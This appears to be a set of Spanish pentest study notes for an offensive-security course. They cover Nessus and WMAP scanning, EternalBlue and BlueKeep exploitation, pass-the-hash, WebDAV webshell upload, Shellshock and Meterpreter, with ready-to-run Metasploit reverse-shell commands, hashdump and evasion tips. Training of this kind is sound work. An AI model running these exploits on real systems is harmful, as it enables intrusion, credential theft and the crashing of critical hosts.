---
creado: 2026-02-16 18:14
tags:
  - tipo/apunte
  - ejpt
  - vuln
  - workflow
  - recon
  - enum
  - metasploit
asignatura: Ciberseguridad Ofensiva
---


_Fusi√≥n de Nessus, MSF Scanning, Autopwn y WMAP. Tu metodolog√≠a de diagn√≥stico._

Markdown

````
# üîç Vulnerability Assessment Workflow

**Scope:** Identificaci√≥n automatizada de vulnerabilidades y gesti√≥n de bases de datos.
**Tools:** Nessus, Metasploit (WMAP/Autopwn), Searchsploit.

---

## 1. Database & Workspace Management
Mant√©n tus datos organizados. Un pentest profesional maneja miles de activos.

```bash
service postgresql start
msfconsole

# Crear espacio de trabajo aislado
workspace -a <PROJECT_NAME>

# Importar escaneos previos de Nmap
db_nmap -sS -sV -O <TARGET_IP>

# Verificar servicios detectados
services
````

---

## 2. Integrating Nessus

Nessus es el est√°ndar de la industria. No reinventes la rueda; imp√≥rtala.

1. Ejecuta el escaneo en Nessus (GUI).
    
2. Exporta el reporte como `.nessus`.
    
3. Importa en Metasploit para correlacionar con exploits disponibles:
    
    Bash
    
    ```
    db_import /path/to/report.nessus
    vulns  # Lista las vulnerabilidades importadas
    ```
    

---

## 3. Web App Scanning (WMAP)

El plugin nativo de Metasploit para aplicaciones web (similar a Nikto/Zap pero integrado).

Bash

```
load wmap

# 1. Definir el sitio (Base URL)
wmap_sites -a http://<TARGET_IP>

# 2. Definir el objetivo espec√≠fico (Path)
wmap_targets -t http://<TARGET_IP>/index.php

# 3. Listar m√≥dulos disponibles para el perfil
wmap_run -t

# 4. EJECUTAR (Attack)
wmap_run -e
```

---

## 4. Exploit Correlation (Searchsploit)

Antes de usar un script de Metasploit, verifica si existen exploits p√∫blicos manuales.

Bash

```
# B√∫squeda general
searchsploit "Microsoft IIS 7.0"

# Filtrar solo m√≥dulos de Metasploit
searchsploit "Windows SMB" | grep -i metasploit
```

---

## üè≠ OT/ICS Impact: Scanning Danger

> [!DANGER] **DO NOT SCAN PLCs** Las herramientas de escaneo de vulnerabilidades (Nessus, OpenVAS, WMAP) lanzan miles de paquetes malformados.
> 
> - **Riesgo:** Un PLC antiguo (Legacy) tiene una pila TCP/IP fr√°gil. Un escaneo de puertos agresivo o un plugin de Nessus puede saturar su CPU, provocando que deje de controlar el brazo rob√≥tico o la v√°lvula de presi√≥n.
>     
> - **Regla:** En redes OT, usa solo **Escaneo Pasivo** (sniffing) o escaneos activos selectivos y lentos (`-T2`) previamente aprobados.
>     

````

---

### Archivo 2: `07_Windows_Kernel_Exploitation.md`
*Fusi√≥n de EternalBlue, BlueKeep y Vulnerabilidades de Windows. Aqu√≠ est√°n las "Balas de Plata".*

```markdown
# üí• Windows Infrastructure Exploitation (Kernel Level)

**Scope:** Explotaci√≥n de vulnerabilidades cr√≠ticas en SMB y RDP.
**Warning:** Estos exploits atacan el Kernel (Ring 0). Fallar = BSOD (Crash del sistema).

---

## 1. MS17-010 (EternalBlue)
*El exploit de la NSA. Ataca SMBv1.*
**Targets:** Windows 7, Server 2008, 2012, 10 (sin parches).

### Detection
Siempre verifica antes de disparar.
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run
````

### Exploitation

Bash

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
# Process Injection (Critical for stability)
set PROCESSNAME lsass.exe 
exploit
```

---

## 2. CVE-2019-0708 (BlueKeep)

_Vulnerabilidad cr√≠tica en RDP (Remote Desktop Protocol). Ejecuci√≥n remota de c√≥digo sin autenticaci√≥n._ **Targets:** Windows 7, Server 2008 R2.

### Detection

Bash

```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <TARGET_IP>
run
```

### Exploitation

> [!WARNING] High Crash Risk El exploit de BlueKeep es inestable. Si fallas, reinicias el servidor objetivo.

Bash

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <TARGET_IP>
# Ajustar el target espec√≠fico (Target 1 suele ser VM, Target 2 Physical)
set TARGET <ID> 
exploit
```

---

## 3. Pass The Hash (Post-Exploitation)

_T√©cnica limpia. No necesitas romper la contrase√±a, solo necesitas el Hash NTLM._

**Requisito:** Haber dumpeado hashes previamente (`hashdump`).

Bash

```
# Metasploit (PsExec)
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <LM_HASH:NTLM_HASH>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

**Alternative (CrackMapExec - Faster):**

Bash

```
crackmapexec smb <TARGET_IP> -u Administrator -H <HASH> -x "ipconfig"
```

---

## üè≠ OT/ICS Impact: The Legacy Problem

En plantas industriales, encontrar√°s Windows XP y Windows 7 ejecutando HMIs cr√≠ticos que **no se pueden parchear** porque el software del fabricante industrial no es compatible con versiones nuevas.

- **EternalBlue** es el vector #1 de propagaci√≥n de Ransomware en redes OT (ej. LockerGoga, WannaCry).
    
- Si encuentras un equipo vulnerable en OT, **NO LO EXPLOTES** sin autorizaci√≥n expl√≠cita de "Parada de Planta". Reporta el hallazgo como **CR√çTICO INMEDIATO**.
    

````

---

### Archivo 3: `08_Web_Exploitation_Vectors.md`
*Fusi√≥n de WebDAV, Shellshock y IIS.*

```markdown
# üï∏Ô∏è Web Application Vectors (Shellshock & WebDAV)

**Scope:** Explotaci√≥n de configuraciones web inseguras y vulnerabilidades CGI antiguas.

---

## 1. WebDAV (Microsoft IIS)
*Web Distributed Authoring and Versioning. Si tienes credenciales, tienes RCE.*

### Recon & Brute Force
Usar Hydra o Metasploit para adivinar credenciales.
```bash
hydra -L users.txt -P pass.txt <TARGET_IP> http-get /webdav/
````

### Exploitation (Upload Webshell)

Herramientas: `davtest` (Scanner) y `cadaver` (Cliente).

1. **Conectar:**
    
    Bash
    
    ```
    cadaver http://<TARGET_IP>/webdav
    ```
    
2. **Subir Webshell (ASP/ASPX):** Los webshells est√°n en `/usr/share/webshells/`.
    
    Bash
    
    ```
    put /usr/share/webshells/asp/webshell.asp
    ```
    
3. **Ejecutar:** Navegar a `http://<TARGET_IP>/webdav/webshell.asp` y ejecutar comandos.
    

---

## 2. Shellshock (CVE-2014-6271)

_Vulnerabilidad en Bash invocada a trav√©s de scripts CGI en servidores web._

**Vector:** Modificar el `User-Agent` u otras cabeceras HTTP para inyectar comandos Bash.

### Detection (Nmap NSE)

Bash

```
nmap -sV -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi <TARGET_IP>
```

### Exploitation (Metasploit)

Bash

```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <TARGET_IP>
set TARGETURI /cgi-bin/vulnerable_script.cgi
exploit
```

---

## üè≠ OT/ICS Impact: Embedded Web Servers

Muchos PLCs y tarjetas de red industriales (Ethernet Cards) tienen servidores web embebidos para configuraci√≥n.

- A menudo corren versiones recortadas de Linux (BusyBox) con scripts CGI muy antiguos.
    
- **Shellshock** sigue vivo en dispositivos IoT/OT fabricados antes de 2014 que nunca se actualizaron.
    

````

---

### Archivo 4: `09_Payloads_and_Post_Exploitation.md`
*Tu gu√≠a sobre Meterpreter y tipos de Payloads. El cierre perfecto.*

```markdown
# üîß Payloads & Meterpreter: Post-Exploitation Arsenal

**Concepto:** El Payload es el c√≥digo que se ejecuta *despu√©s* del exploit.
**Golden Rule:** "Get In, Get Data, Get Out."

---

## 1. Payload Types

### Singles (Inline)
* **Qu√© es:** El c√≥digo completo en un solo paquete.
* **Pros:** Estable.
* **Contras:** Grande. Puede fallar si el buffer de memoria es peque√±o.
* *Ejemplo:* `windows/shell_reverse_tcp`

### Staged (Por Etapas)
* **Qu√© es:** Env√≠a un peque√±o "Stager" primero, que luego descarga el resto (Meterpreter).
* **Pros:** Cabe en cualquier exploit. Evasivo.
* **Sintaxis:** Nota la barra `/` entre meterpreter y reverse.
* *Ejemplo:* `windows/meterpreter/reverse_tcp`

---

## 2. Meterpreter: The Swiss Army Knife
Una shell que corre **en memoria** (RAM) a trav√©s de DLL Injection. No toca el disco duro (Fileless), lo que evade antivirus tradicionales.

### Essential Commands
| Comando | Funci√≥n | Contexto |
| :--- | :--- | :--- |
| `sysinfo` | Info del SO y Arquitectura. | Recon |
| `getuid` | Usuario actual. | PrivEsc |
| `hashdump` | Vuelca hashes SAM (Requiere Admin). | Credential Access |
| `upload / download` | Exfiltraci√≥n y transferencia de herramientas. | Lateral Movement |
| `shell` | Cae a una CMD/Bash nativa del sistema. | Fallback |
| `migrate <PID>` | Moverse a otro proceso (ej. explorer.exe). | **Persistencia** |

---

## üè≠ OT/ICS Impact: In-Memory Stealth
Meterpreter es poderoso, pero en redes industriales monitoreadas (con IDS tipo Nozomi/Claroty):
* El tr√°fico de red C2 (Command & Control) es constante y an√≥malo.
* **Recomendaci√≥n:** En Red Teaming industrial, usa beacons lentos (Low and Slow) o herramientas nativas del sistema ("Living off the Land") en lugar de mantener una sesi√≥n de Meterpreter abierta constantemente.
````
